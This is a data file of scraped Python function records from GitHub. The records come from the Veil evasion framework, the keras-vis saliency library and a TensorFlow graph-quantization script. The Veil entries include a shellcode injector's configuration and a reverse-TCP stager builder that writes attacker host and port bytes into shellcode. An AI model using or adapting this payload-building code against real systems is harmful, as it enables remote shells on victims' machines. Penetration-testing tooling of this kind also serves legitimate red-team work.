{"docstring": "# required options\n", "func_signal": "def __init__(self, cli_obj):\n", "code": "self.shortname = \"VirtualAlloc\"\nself.language = \"lua\"\nself.extension = \"lua\"\nself.rating = \"Excellent\"\nself.description = \"VirtualAlloc pattern for shellcode injection\"\nself.name = \"Lua flat shellcode injector\"\nself.required_options = {}\nself.path = \"lua/shellcode_inject/flat\"\nself.cli_opts = cli_obj\nself.shellcode = shellcode_help.Shellcode(cli_obj)\nself.payload_source_code = \"\"\nif cli_obj.ordnance_payload is not None:\n    self.payload_type = cli_obj.ordnance_payload\nelif cli_obj.msfvenom is not None:\n    self.payload_type = cli_obj.msfvenom\nelif not cli_obj.tool:\n    self.payload_type = \"\"\nself.cli_shellcode = False", "path": "Veil/tools/evasion/payloads/lua/shellcode_inject/flat.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "'''Prints shellcode'''\n", "func_signal": "def print_shellcode(self):\n", "code": "print(self.customized_shellcode)\nreturn", "path": "Veil/tools/ordnance/payloads/x86/rev_tcp.py", "commit_date": "2018-04-17 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "'''Invoked by main menu, generates code'''\n", "func_signal": "def gen_shellcode(self):\n", "code": "self.payload_gen()\nreturn", "path": "Veil/tools/ordnance/payloads/x86/rev_tcp_dns.py", "commit_date": "2018-04-17 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "# required options\n", "func_signal": "def __init__(self, cli_obj):\n", "code": "self.description = \"Auxiliary script which converts a .exe file to .war\"\nself.language = \"python\"\nself.rating = \"Normal\"\nself.extension = \"war\"\nself.name = \"Coldwar Wrapper\"\nself.path = \"auxuliary/coldwar_wrapper\"\nself.cli_opts = cli_obj\nself.payload_source_code = \"\"\n\nself.required_options = {\n                            \"ORIGINAL_EXE\" : [\"\", \"Path to a .exe file to convert to .war file\"]  #/usr/share/windows-binaries/nc.exe\n                        }", "path": "Veil/tools/evasion/payloads/auxiliary/coldwar_wrapper.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "# Take the passed in attributes and gen shellcode\n", "func_signal": "def payload_gen(self):\n", "code": "ip_shellcode = \"\"\nn = 2\nip_shellcode_stage = binascii.hexlify(socket.inet_aton(self.required_options[\"LHOST\"][0]))\nip_shellcode_stage = [ip_shellcode_stage[i:i + n] for i in range(0, len(ip_shellcode_stage), n)]\nfor two_bytes in ip_shellcode_stage:\n    ip_shellcode += '\\\\x' + two_bytes.decode('UTF-8')\n\n# convert port to shellcode\nport_shellcode_stage = str(hex(int(self.required_options['LPORT'][0])).lstrip('0'))\nif len(port_shellcode_stage.lstrip('x')) == 3:\n    # detect if odd number, is so, need to add a '0' to the front\n    port_1half = '0' + port_shellcode_stage[0:2].lstrip('x')\n    port_1half = '\\\\x' + port_1half\n    port_2half = port_shellcode_stage[2:4]\n    port_2half = '\\\\x' + port_2half\n    port_shellcode = port_1half + port_2half\nelif len(port_shellcode_stage.lstrip('x')) == 4:\n    port_1half = port_shellcode_stage[1:3]\n    port_1half = '\\\\x' + port_1half\n    port_2half = port_shellcode_stage[3:5]\n    port_2half = '\\\\x' + port_2half\n    port_shellcode = port_1half + port_2half\nelif len(port_shellcode_stage.lstrip('x')) == 2:\n    port_1half = port_shellcode_stage[1:3].lstrip('x')\n    port_1half = '\\\\x' + port_1half\n    port_2half = '00'\n    port_2half = '\\\\x' + port_2half\n    port_shellcode = port_2half + port_1half\nelif len(port_shellcode_stage.lstrip('x')) == 1:\n    port_1half = port_shellcode_stage.lstrip('x')\n    port_1half = '\\\\x0' + port_1half\n    port_2half = '\\\\x00'\n    port_shellcode = port_2half + port_1half\n\nretries = '\\\\x09'\n\nstager_shellcode = codecs.encode(self.stager[0:self.retries_offset], 'hex')\nstager_shellcode = \"\\\\x\" + '\\\\x'.join(codecs.decode(stager_shellcode[i:i + 2], 'utf-8') for i in range(0, len(stager_shellcode), 2))\nstager_shellcode += retries\n\nstager_shellcode2 = codecs.encode(self.stager[self.retries_offset + 1:self.lhost_offset], 'hex')\nstager_shellcode2 = \"\\\\x\" + '\\\\x'.join(codecs.decode(stager_shellcode2[i:i + 2], 'utf-8') for i in range(0, len(stager_shellcode2), 2))\nstager_shellcode2 += ip_shellcode\n\nstager_shellcode3 = codecs.encode(self.stager[self.lhost_offset + 4:self.lport_offset], 'hex')\nstager_shellcode3 = \"\\\\x\" + '\\\\x'.join(codecs.decode(stager_shellcode3[i:i + 2], 'utf-8') for i in range(0, len(stager_shellcode3), 2))\nstager_shellcode3 += port_shellcode\n\nstager_shellcode4 = codecs.encode(self.stager[self.lport_offset + 2:], 'hex')\nstager_shellcode4 = \"\\\\x\" + '\\\\x'.join(codecs.decode(stager_shellcode4[i:i + 2], 'utf-8') for i in range(0, len(stager_shellcode4), 2))\n\nself.customized_shellcode = stager_shellcode + stager_shellcode2 + stager_shellcode3 + stager_shellcode4\nreturn", "path": "Veil/tools/ordnance/payloads/x86/rev_tcp.py", "commit_date": "2018-04-17 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "'''Invoked by main menu, generates code'''\n", "func_signal": "def gen_shellcode(self):\n", "code": "self.payload_gen()\nreturn", "path": "Veil/tools/ordnance/payloads/x86/rev_tcp.py", "commit_date": "2018-04-17 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "'''Invoked by main menu, generates code'''\n", "func_signal": "def gen_shellcode(self):\n", "code": "self.payload_gen()\nreturn", "path": "Veil/tools/ordnance/payloads/x86/bind_tcp.py", "commit_date": "2018-04-17 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "\"\"\"Utility function to stitch images together with a `margin`.\n\nArgs:\n    images: The array of 2D images to stitch.\n    margin: The black border margin size between images (Default value = 5)\n    cols: Max number of image cols. New row is created when number of images exceed the column size.\n        (Default value = 5)\n\nReturns:\n    A single numpy image array comprising of input images.\n\"\"\"\n", "func_signal": "def stitch_images(images, margin=5, cols=5):\n", "code": "if len(images) == 0:\n    return None\n\nh, w, c = images[0].shape\nn_rows = int(math.ceil(len(images) / cols))\nn_cols = min(len(images), cols)\n\nout_w = n_cols * w + (n_cols - 1) * margin\nout_h = n_rows * h + (n_rows - 1) * margin\nstitched_images = np.zeros((out_h, out_w, c), dtype=images[0].dtype)\n\nfor row in range(n_rows):\n    for col in range(n_cols):\n        img_idx = row * cols + col\n        if img_idx >= len(images):\n            break\n\n        stitched_images[(h + margin) * row: (h + margin) * row + h,\n                        (w + margin) * col: (w + margin) * col + w, :] = images[img_idx]\n\nreturn stitched_images", "path": "keras-vis/vis/utils/utils.py", "commit_date": "2018-01-20 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "# FIXME Can't set None to filter_indices with Theano backend.\n# To get green test, it set zero.\n# grads = visualize_saliency(model, -1, filter_indices=None, seed_input=data)\n", "func_signal": "def test_visualize_saliency(model, data):\n", "code": "grads = visualize_saliency(model, -1, filter_indices=0, seed_input=data)\nassert grads.shape == (28, 28)", "path": "keras-vis/tests/vis/visualization/test_saliency.py", "commit_date": "2018-09-15 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Utility function to scale the `input_array` to `input_range` throwing away high frequency artifacts.\n\nArgs:\n    input_array: An N-dim numpy array.\n    input_range: Specifies the input range as a `(min, max)` tuple to rescale the `input_array`.\n\nReturns:\n    The rescaled `input_array`.\n\"\"\"\n# normalize tensor: center on 0., ensure std is 0.1\n", "func_signal": "def deprocess_input(input_array, input_range=(0, 255)):\n", "code": "input_array = input_array.copy()\ninput_array -= input_array.mean()\ninput_array /= (input_array.std() + K.epsilon())\ninput_array *= 0.1\n\n# clip to [0, 1]\ninput_array += 0.5\ninput_array = np.clip(input_array, 0, 1)\n\n# Convert to `input_range`\nreturn (input_range[1] - input_range[0]) * input_array + input_range[0]", "path": "keras-vis/vis/utils/utils.py", "commit_date": "2018-01-20 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Utility function to load an image from disk.\n\nArgs:\n  path: The image file path.\n  grayscale: True to convert to grayscale image (Default value = False)\n  target_size: (w, h) to resize. (Default value = None)\n\nReturns:\n    The loaded numpy image.\n\"\"\"\n", "func_signal": "def load_img(path, grayscale=False, target_size=None):\n", "code": "img = io.imread(path, grayscale)\nif target_size:\n    img = transform.resize(img, target_size, preserve_range=True).astype('uint8')\nreturn img", "path": "keras-vis/vis/utils/utils.py", "commit_date": "2018-01-20 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Helper utility to retrieve the callable function associated with a string identifier.\n\nArgs:\n    identifier: The identifier. Could be a string or function.\n    module_globals: The global objects of the module.\n    module_name: The module name\n\nReturns:\n    The callable associated with the identifier.\n\"\"\"\n", "func_signal": "def get_identifier(identifier, module_globals, module_name):\n", "code": "if isinstance(identifier, six.string_types):\n    fn = module_globals.get(identifier)\n    if fn is None:\n        raise ValueError('Unknown {}: {}'.format(module_name, identifier))\n    return fn\nelif callable(identifier):\n    return identifier\nelse:\n    raise ValueError('Could not interpret identifier')", "path": "keras-vis/vis/utils/utils.py", "commit_date": "2018-01-20 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Draws text over the image. Requires PIL.\n\nArgs:\n    img: The image to use.\n    text: The text string to overlay.\n    position: The text (x, y) position. (Default value = (10, 10))\n    font: The ttf or open type font to use. (Default value = 'FreeSans.ttf')\n    font_size: The text font size. (Default value = 12)\n    color: The (r, g, b) values for text color. (Default value = (0, 0, 0))\n\nReturns: Image overlayed with text.\n\"\"\"\n", "func_signal": "def draw_text(img, text, position=(10, 10), font='FreeSans.ttf', font_size=14, color=(0, 0, 0)):\n", "code": "_check_pil()\n\nfont_files = _find_font_file(font)\nif len(font_files) == 0:\n    logger.warn(\"Failed to lookup font '{}', falling back to default\".format(font))\n    font = ImageFont.load_default()\nelse:\n    font = ImageFont.truetype(font_files[0], font_size)\n\n# Don't mutate original image\nimg = Image.fromarray(img)\ndraw = ImageDraw.Draw(img)\ndraw.text(position, text, fill=color, font=font)\nreturn np.asarray(img)", "path": "keras-vis/vis/utils/utils.py", "commit_date": "2018-01-20 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Applies modifications to the model layers to create a new Graph. For example, simply changing\n`model.layers[idx].activation = new activation` does not change the graph. The entire graph needs to be updated\nwith modified inbound and outbound tensors because of change in layer building function.\n\nArgs:\n    model: The `keras.models.Model` instance.\n\nReturns:\n    The modified model with changes applied. Does not mutate the original `model`.\n\"\"\"\n# The strategy is to save the modified model and load it back. This is done because setting the activation\n# in a Keras layer doesnt actually change the graph. We have to iterate the entire graph and change the\n# layer inbound and outbound nodes with modified tensors. This is doubly complicated in Keras 2.x since\n# multiple inbound and outbound nodes are allowed with the Graph API.\n", "func_signal": "def apply_modifications(model, custom_objects=None):\n", "code": "model_path = os.path.join(tempfile.gettempdir(), next(tempfile._get_candidate_names()) + '.h5')\ntry:\n    model.save(model_path)\n    return load_model(model_path, custom_objects=custom_objects)\nfinally:\n    os.remove(model_path)", "path": "keras-vis/vis/utils/utils.py", "commit_date": "2018-01-20 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Creates a copy of model by modifying all activations to use a custom op to modify the backprop behavior.\n\nArgs:\n    model:  The `keras.models.Model` instance.\n    backprop_modifier: One of `{'guided', 'rectified'}`\n\nReturns:\n    A copy of model with modified activations for backwards pass.\n\"\"\"\n# The general strategy is as follows:\n# - Save original model so that upstream callers don't see unexpected results with their models.\n# - Call backend specific function that registers the custom op and loads the model under modified context manager.\n# - Maintain cache to save this expensive process on subsequent calls.\n# - Load model with custom context modifying backprop behavior.\n#\n# The reason for this round about way is because the graph needs to be rebuild when any of its layer builder\n# functions are changed. This is very complicated to do in Keras and makes the implementation very tightly bound\n# with keras internals. By saving and loading models, we dont have to worry about future compatibility.\n#\n# The only exception to this is the way advanced activations are handled which makes use of some keras internal\n# knowledge and might break in the future.\n# ADD on 22 Jul 2018:\n#     In fact, it has broken. Currently, advanced activations are not supported.\n\n# 0. Retrieve from cache if previously computed.\n", "func_signal": "def modify_model_backprop(model, backprop_modifier):\n", "code": "modified_model = _MODIFIED_MODEL_CACHE.get((model, backprop_modifier))\nif modified_model is not None:\n    return modified_model\n\nmodel_path = os.path.join(tempfile.gettempdir(), next(tempfile._get_candidate_names()) + '.h5')\ntry:\n    # 1. Save original model\n    model.save(model_path)\n\n    # 2. Register modifier and load modified model under custom context.\n    modifier_fn = _BACKPROP_MODIFIERS.get(backprop_modifier)\n    if modifier_fn is None:\n        raise ValueError(\"'{}' modifier is not supported\".format(backprop_modifier))\n    modifier_fn(backprop_modifier)\n\n    # 3. Create graph under custom context manager.\n    with tf.get_default_graph().gradient_override_map({'Relu': backprop_modifier}):\n        #  This should rebuild graph with modifications.\n        modified_model = load_model(model_path)\n\n        # Cache to improve subsequent call performance.\n        _MODIFIED_MODEL_CACHE[(model, backprop_modifier)] = modified_model\n        return modified_model\nfinally:\n    os.remove(model_path)", "path": "keras-vis/vis/backend/tensorflow_backend.py", "commit_date": "2018-07-22 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Looks up the layer index corresponding to `layer_name` from `model`.\n\nArgs:\n    model: The `keras.models.Model` instance.\n    layer_name: The name of the layer to lookup.\n\nReturns:\n    The layer index if found. Raises an exception otherwise.\n\"\"\"\n", "func_signal": "def find_layer_idx(model, layer_name):\n", "code": "layer_idx = None\nfor idx, layer in enumerate(model.layers):\n    if layer.name == layer_name:\n        layer_idx = idx\n        break\n\nif layer_idx is None:\n    raise ValueError(\"No layer with name '{}' within the model\".format(layer_name))\nreturn layer_idx", "path": "keras-vis/vis/utils/utils.py", "commit_date": "2018-01-20 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Creates a uniformly distributed random array with the given `mean` and `std`.\n\nArgs:\n    shape: The desired shape\n    mean: The desired mean (Default value = 128)\n    std: The desired std (Default value = 20)\n\nReturns: Random numpy array of given `shape` uniformly distributed with desired `mean` and `std`.\n\"\"\"\n", "func_signal": "def random_array(shape, mean=128., std=20.):\n", "code": "x = np.random.random(shape)\n# normalize around mean=0, std=1\nx = (x - np.mean(x)) / (np.std(x) + K.epsilon())\n# and then around the desired mean/std\nx = (x * std) + mean\nreturn x", "path": "keras-vis/vis/utils/utils.py", "commit_date": "2018-01-20 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Utility function to return the image net label for the final `dense` layer output index.\n\nArgs:\n    indices: Could be a single value or an array of indices whose labels should be looked up.\n\nReturns:\n    Image net label corresponding to the image category.\n\"\"\"\n", "func_signal": "def lookup_imagenet_labels(indices):\n", "code": "global _CLASS_INDEX\nif _CLASS_INDEX is None:\n    with open(os.path.join(os.path.dirname(__file__), '../../resources/imagenet_class_index.json')) as f:\n        _CLASS_INDEX = json.load(f)\n\nindices = listify(indices)\nreturn [_CLASS_INDEX[str(idx)][1] for idx in indices]", "path": "keras-vis/vis/utils/utils.py", "commit_date": "2018-01-20 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Updates `kwargs` with dict of `defaults`\n\nArgs:\n    defaults: A dictionary of keys and values\n    **kwargs: The kwargs to update.\n\nReturns:\n    The updated kwargs.\n\"\"\"\n", "func_signal": "def add_defaults_to_kwargs(defaults, **kwargs):\n", "code": "defaults = dict(defaults)\ndefaults.update(kwargs)\nreturn defaults", "path": "keras-vis/vis/utils/utils.py", "commit_date": "2018-01-20 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Assuming a slice for shape `(samples, channels, image_dims...)`\n\"\"\"\n", "func_signal": "def __getitem__(self, item_slice):\n", "code": "if K.image_data_format() == 'channels_first':\n    return item_slice\nelse:\n    # Move channel index to last position.\n    item_slice = list(item_slice)\n    item_slice.append(item_slice.pop(1))\n    return tuple(item_slice)", "path": "keras-vis/vis/utils/utils.py", "commit_date": "2018-01-20 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Searches for the nearest penultimate `Conv` or `Pooling` layer.\n\nArgs:\n    model: The `keras.models.Model` instance.\n    layer_idx: The layer index within `model.layers`.\n    penultimate_layer_idx: The pre-layer to `layer_idx`. If set to None, the nearest penultimate\n        `Conv` or `Pooling` layer is used.\n\nReturns:\n    The penultimate layer.\n\"\"\"\n", "func_signal": "def _find_penultimate_layer(model, layer_idx, penultimate_layer_idx):\n", "code": "if penultimate_layer_idx is None:\n    for idx, layer in utils.reverse_enumerate(model.layers[:layer_idx - 1]):\n        if isinstance(layer, Wrapper):\n            layer = layer.layer\n        if isinstance(layer, (_Conv, _Pooling1D, _Pooling2D, _Pooling3D)):\n            penultimate_layer_idx = idx\n            break\n\nif penultimate_layer_idx is None:\n    raise ValueError('Unable to determine penultimate `Conv` or `Pooling` '\n                     'layer for layer_idx: {}'.format(layer_idx))\n\n# Handle negative indexing otherwise the next check can fail.\nif layer_idx < 0:\n    layer_idx = len(model.layers) + layer_idx\nif penultimate_layer_idx > layer_idx:\n    raise ValueError('`penultimate_layer_idx` needs to be before `layer_idx`')\n\nreturn model.layers[penultimate_layer_idx]", "path": "keras-vis/vis/visualization/saliency.py", "commit_date": "2019-06-26 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Returns image shape in a backend agnostic manner.\n\nArgs:\n    img: An image tensor of shape: `(channels, image_dims...)` if data_format='channels_first' or\n        `(image_dims..., channels)` if data_format='channels_last'.\n\nReturns:\n    Tuple containing image shape information in `(samples, channels, image_dims...)` order.\n\"\"\"\n", "func_signal": "def get_img_shape(img):\n", "code": "if isinstance(img, np.ndarray):\n    shape = img.shape\nelse:\n    shape = K.int_shape(img)\n\nif K.image_data_format() == 'channels_last':\n    shape = list(shape)\n    shape.insert(1, shape[-1])\n    shape = tuple(shape[:-1])\nreturn shape", "path": "keras-vis/vis/utils/utils.py", "commit_date": "2018-01-20 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "# Create a simple 2 dense layer model.\n", "func_signal": "def test_guided_grad_modifier():\n", "code": "simple_model = Sequential([\n    Dense(2, activation='relu', use_bias=False, kernel_initializer=Constant([[-1., 1.], [-1., 1.]]), input_shape=(2,)),\n    Dense(1, activation='linear', use_bias=False, kernel_initializer=Constant([-1., 1.]))\n])\nsimple_model.compile(loss=keras.losses.categorical_crossentropy, optimizer=keras.optimizers.Adam())\n\n# Create a simple 2 dense layer model using Activation.\nsimple_model_with_activation = Sequential([\n    Dense(2, activation='linear', use_bias=False, kernel_initializer=Constant([[-1., 1.], [-1., 1.]]), input_shape=(2,)),\n    Activation('relu'),\n    Dense(1, activation='linear', use_bias=False, kernel_initializer=Constant([-1., 1.]))\n])\nsimple_model_with_activation.compile(loss=keras.losses.categorical_crossentropy, optimizer=keras.optimizers.Adam())\n\nfor i, model in enumerate([simple_model, simple_model_with_activation]):\n    # Create guided backprop model\n    modified_model = modify_model_backprop(model, 'guided')\n\n    # Gradients are zeros.\n    input_array = [0., 0.]\n    assert np.array_equal(_compute_grads(model, input_array), [0., 0.])\n    assert np.array_equal(_compute_grads(modified_model, input_array), [0., 0.])\n\n    # Below 3 cases, GuidedBackprop gradients is the same as Original gradients.\n    input_array = [1., 0.]\n    assert np.array_equal(_compute_grads(model, input_array), [1., 1.])\n    assert np.array_equal(_compute_grads(modified_model, input_array), [1., 1.])\n\n    input_array = [0., 1.]\n    assert np.array_equal(_compute_grads(model, input_array), [1., 1.])\n    assert np.array_equal(_compute_grads(modified_model, input_array), [1., 1.])\n\n    input_array = [1., 1.]\n    assert np.array_equal(_compute_grads(model, input_array), [1., 1.])\n    assert np.array_equal(_compute_grads(modified_model, input_array), [1., 1.])\n\n    # If inputs contains negative values,\n    # GuidedBackprop gradients is not the same as Original gradients.\n    input_array = [-1., 0.]\n    assert np.array_equal(_compute_grads(model, input_array), [1., 1.])\n    assert np.array_equal(_compute_grads(modified_model, input_array), [0., 0.])\n\n    input_array = [0., -1.]\n    assert np.array_equal(_compute_grads(model, input_array), [1., 1.])\n    assert np.array_equal(_compute_grads(modified_model, input_array), [0., 0.])\n\n    input_array = [-1., -1.]\n    assert np.array_equal(_compute_grads(model, input_array), [1., 1.])\n    assert np.array_equal(_compute_grads(modified_model, input_array), [0., 0.])\n\n    # Activation is not changed.\n    if i == 0:  # modified first model\n        modified_model.layers[0].activation == keras.activations.relu\n        modified_model.layers[1].activation == keras.activations.linear\n    if i == 1:  # modified second model\n        modified_model.layers[0].activation == keras.activations.linear\n        modified_model.layers[1].activation == keras.activations.relu\n        modified_model.layers[2].activation == keras.activations.linear", "path": "keras-vis/tests/vis/backend/test_backend.py", "commit_date": "2018-07-23 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Clips negative gradient values.\n\nArgs:\n    grads: A numpy array of grads to use.\n\nReturns:\n    The rectified gradients.\n\"\"\"\n", "func_signal": "def relu(grads):\n", "code": "grads[grads < 0.] = 0.\nreturn grads", "path": "keras-vis/vis/grad_modifiers.py", "commit_date": "2017-07-05 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Normalizes the numpy array to (min_value, max_value)\n\nArgs:\n    array: The numpy array\n    min_value: The min value in normalized array (Default value = 0)\n    max_value: The max value in normalized array (Default value = 1)\n\nReturns:\n    The array normalized to range between (min_value, max_value)\n\"\"\"\n", "func_signal": "def normalize(array, min_value=0., max_value=1.):\n", "code": "arr_min = np.min(array)\narr_max = np.max(array)\nnormalized = (array - arr_min) / (arr_max - arr_min + K.epsilon())\nreturn (max_value - min_value) * normalized + min_value", "path": "keras-vis/vis/utils/utils.py", "commit_date": "2018-01-20 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Generates an attention heatmap over the `seed_input` by using positive gradients of `input_tensor`\nwith respect to weighted `losses`.\n\nThis function is intended for advanced use cases where a custom loss is desired. For common use cases,\nrefer to `visualize_class_saliency` or `visualize_regression_saliency`.\n\nFor a full description of saliency, see the paper:\n[Deep Inside Convolutional Networks: Visualising Image Classification Models and Saliency Maps]\n(https://arxiv.org/pdf/1312.6034v2.pdf)\n\nArgs:\n    input_tensor: An input tensor of shape: `(samples, channels, image_dims...)` if `image_data_format=\n        channels_first` or `(samples, image_dims..., channels)` if `image_data_format=channels_last`.\n    losses: List of ([Loss](vis.losses.md#Loss), weight) tuples.\n    seed_input: The model input for which activation map needs to be visualized.\n    wrt_tensor: Short for, with respect to. The gradients of losses are computed with respect to this tensor.\n        When None, this is assumed to be the same as `input_tensor` (Default value: None)\n    grad_modifier: gradient modifier to use. See [grad_modifiers](vis.grad_modifiers.md). By default `absolute`\n        value of gradients are used. To visualize positive or negative gradients, use `relu` and `negate`\n        respectively. (Default value = 'absolute')\n    keepdims: A boolean, whether to keep the dimensions or not.\n        If keepdims is False, the channels axis is deleted.\n        If keepdims is True, the grad with same shape as input_tensor is returned. (Default value: False)\n\nReturns:\n    The normalized gradients of `seed_input` with respect to weighted `losses`.\n\"\"\"\n", "func_signal": "def visualize_saliency_with_losses(input_tensor, losses, seed_input, wrt_tensor=None, grad_modifier='absolute', keepdims=False):\n", "code": "opt = Optimizer(input_tensor, losses, wrt_tensor=wrt_tensor, norm_grads=False)\ngrads = opt.minimize(seed_input=seed_input, max_iter=1, grad_modifier=grad_modifier, verbose=False)[1]\n\nif not keepdims:\n    channel_idx = 1 if K.image_data_format() == 'channels_first' else -1\n    grads = np.max(grads, axis=channel_idx)\nreturn utils.normalize(grads)[0]", "path": "keras-vis/vis/visualization/saliency.py", "commit_date": "2019-06-26 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Ensures that the value is a list. If it is not a list, it creates a new list with `value` as an item.\n\"\"\"\n", "func_signal": "def listify(value):\n", "code": "if not isinstance(value, list):\n    value = [value]\nreturn value", "path": "keras-vis/vis/utils/utils.py", "commit_date": "2018-01-20 00:00:00", "repo_name": "raghakot/keras-vis", "stars": 2971, "license": "mit", "language": "python", "size": 153803}
{"docstring": "\"\"\"Replaces a MatMul node with the eight bit equivalent sub-graph.\"\"\"\n", "func_signal": "def eightbitize_mat_mul_node(self, original_node):\n", "code": "quantized_mat_mul_name = original_node.name + \"_eightbit_quantized_mat_mul\"\nall_input_names = self.add_eightbit_prologue_nodes(original_node)\nquantized_mat_mul_node = create_node(\"QuantizedMatMul\",\n                                     quantized_mat_mul_name,\n                                     all_input_names)\nset_attr_dtype(quantized_mat_mul_node, \"T1\", dtypes.quint8)\nset_attr_dtype(quantized_mat_mul_node, \"T2\", dtypes.quint8)\nset_attr_dtype(quantized_mat_mul_node, \"Toutput\", dtypes.qint32)\ncopy_attr(quantized_mat_mul_node, \"transpose_a\",\n          original_node.attr[\"transpose_a\"])\ncopy_attr(quantized_mat_mul_node, \"transpose_b\",\n          original_node.attr[\"transpose_b\"])\nself.add_output_graph_node(quantized_mat_mul_node)\nquantize_down_name = self.add_quantize_down_nodes(original_node,\n                                                  quantized_mat_mul_name)\nself.add_dequantize_result_node(quantize_down_name, original_node.name)", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"Should the current node merge with self.state.output_node_stack[-1]?\"\"\"\n", "func_signal": "def should_merge_with_fake_quant_node(self):\n", "code": "if not self.state.output_node_stack:\n  return False\ntop = self.state.output_node_stack[-1]\nreturn top[1] == 0 and top[0].op in [\"FakeQuantWithMinMaxVars\"]", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"Replaces a Conv2D node with the eight bit equivalent sub-graph.\"\"\"\n", "func_signal": "def eightbitize_conv_node(self, original_node):\n", "code": "all_input_names = self.add_eightbit_prologue_nodes(original_node)\nquantized_conv_name = original_node.name + \"_eightbit_quantized_conv\"\nquantized_conv_node = create_node(\"QuantizedConv2D\", quantized_conv_name,\n                                  all_input_names)\ncopy_attr(quantized_conv_node, \"strides\", original_node.attr[\"strides\"])\ncopy_attr(quantized_conv_node, \"padding\", original_node.attr[\"padding\"])\nset_attr_dtype(quantized_conv_node, \"Tinput\", dtypes.quint8)\nset_attr_dtype(quantized_conv_node, \"Tfilter\", dtypes.quint8)\nset_attr_dtype(quantized_conv_node, \"out_type\", dtypes.qint32)\nself.add_output_graph_node(quantized_conv_node)\nquantize_down_name = self.add_quantize_down_nodes(original_node,\n                                                  quantized_conv_name)\nself.add_dequantize_result_node(quantize_down_name, original_node.name)", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"Removes unneeded pairs of quantize/dequantize ops from the graph.\n\nThis is a bit of a tricky function, because it's attempting to spot the\npattern of dequantizing from eight-bit up to float, and then immediately\nquantizing back down to eight bits again, that's introduced by previous\npasses that do 'key-hole' conversions of individual nodes but have to\nconvert back to float to match the previous output interface, since they\ndon't know that the next op can handle quantized tensors.\nIt works by:\n - Looking for Quantize nodes.\n - Checking to see if their first input is a Dequantize node.\n - Seeing if their min/max inputs come from Min/Max nodes.\n - Making sure those Min/Max nodes are being fed from the same Dequantize.\n - Or that the Min is indirectly being fed from the same Dequantize as Max.\n - Making sure the Dequantize is going through a Reshape (which we add\n   during the previous pass when we create the quantize sub-graph).\n - Looking for the dims Const op for the Min/Max dims.\nIf all of these conditions are met, then it's a sub-graph pattern that\nwe know how to optimize out (and is likely the common one we've introduced).\nWe then rewire the graph to skip it entirely, and then rely on the dead node\nremoval pass to get rid of any nodes that are no longer needed.\n\nArgs:\n  old_graph: The model we'll be stripping redundant nodes from.\n\nReturns:\n  A graph with the unnecessary nodes removed.\n\nRaises:\n  ValueError: Two nodes with the same name were found in the graph.\n\"\"\"\n", "func_signal": "def remove_redundant_quantization(self, old_graph):\n", "code": "old_nodes_map = self.create_nodes_map(old_graph)\nself.output_graph = 